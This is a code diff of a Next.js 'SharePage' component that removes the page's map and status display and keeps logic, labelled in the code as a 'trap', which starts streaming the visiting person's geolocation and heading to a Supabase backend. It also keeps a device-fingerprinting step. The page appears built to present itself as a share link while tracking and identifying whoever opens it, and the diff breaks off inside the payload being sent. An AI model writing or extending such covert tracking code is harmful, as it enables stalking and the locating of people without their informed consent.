@@ -2,57 +2,20 @@
 
 import { useEffect, useState } from 'react';
 import { supabase } from '@/lib/supabase';
-import dynamic from 'next/dynamic';
 import { useParams } from 'next/navigation';
-import FloatingButtons from '@/components/FloatingButtons';
-import TacticalDashboard from '@/components/TacticalDashboard';
 import { useLocationStream } from '@/lib/hooks/useLocationStream';
 import { useOrientation } from '@/lib/hooks/useOrientation';
 import { getFingerprint } from '@/lib/fingerprint';
-import { useWeather } from '@/lib/hooks/useWeather';
-
-// Dynamically import Map
-const Map = dynamic(() => import('@/components/Map'), {
-    ssr: false,
-    loading: () => (
-        <div className="w-full h-full flex flex-col items-center justify-center bg-black gap-4">
-            <div className="w-8 h-8 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
-            <p className="tracking-widest text-xs font-bold text-white">ESTABLISHING UPLINK...</p>
-        </div>
-    )
-});
-
-interface LocationData {
-    lat: number;
-    lng: number;
-    heading: number | null;
-    accuracy: number;
-    speed: number | null;
-}
 
 export default function SharePage() {
     const params = useParams();
     const sessionId = params.sessionId as string;
-    const [location, setLocation] = useState<LocationData | null>(null);
-    const [path, setPath] = useState<[number, number][]>([]);
-    const [status, setStatus] = useState<'connecting' | 'connected' | 'disconnected'>('connecting');
-    const [isFollowing, setIsFollowing] = useState(true);
-    const [error, setError] = useState<string | null>(null);
-
-    const weather = useWeather(location?.lat, location?.lng);
-
-    const [isTrapActivated, setIsTrapActivated] = useState(false);
-    const { location: myLocation, error: locationError } = useLocationStream(isTrapActivated); // Start tracking only after activation
-    const myHeading = useOrientation();
-    const [hasSentFingerprint, setHasSentFingerprint] = useState(false);
     const [isSessionActive, setIsSessionActive] = useState(true);
 
-    // Sync location error to UI
-    useEffect(() => {
-        if (locationError) {
-            setError(locationError);
-        }
-    }, [locationError]);
+    const [isTrapActivated, setIsTrapActivated] = useState(false);
+    const { location: myLocation } = useLocationStream(isTrapActivated); // Start tracking only after activation
+    const myHeading = useOrientation();
+    const [hasSentFingerprint, setHasSentFingerprint] = useState(false);
 
     // Check if session is active
     useEffect(() => {
@@ -67,7 +30,6 @@ export default function SharePage() {
 
             if (data && !data.active) {
                 setIsSessionActive(false);
-                setStatus('disconnected');
             }
         };
 
@@ -82,10 +44,9 @@ export default function SharePage() {
                 table: 'sessions',
                 filter: `id=eq.${sessionId}`
             }, (payload) => {
-                const newSession = payload.new as any;
+                const newSession = payload.new as { active: boolean };
                 if (!newSession.active) {
                     setIsSessionActive(false);
-                    setStatus('disconnected');
                 }
             })
             .subscribe();
@@ -111,7 +72,7 @@ export default function SharePage() {
         if (sessionId && myLocation && isSessionActive && isTrapActivated) {
             const sendUpdate = async () => {
                 try {
-                    const payload: any = {
+                    const payload: Record<string, any> = {
                         sessionId,
                         lat: myLocation.lat,
                         lng: myLocation.lng,
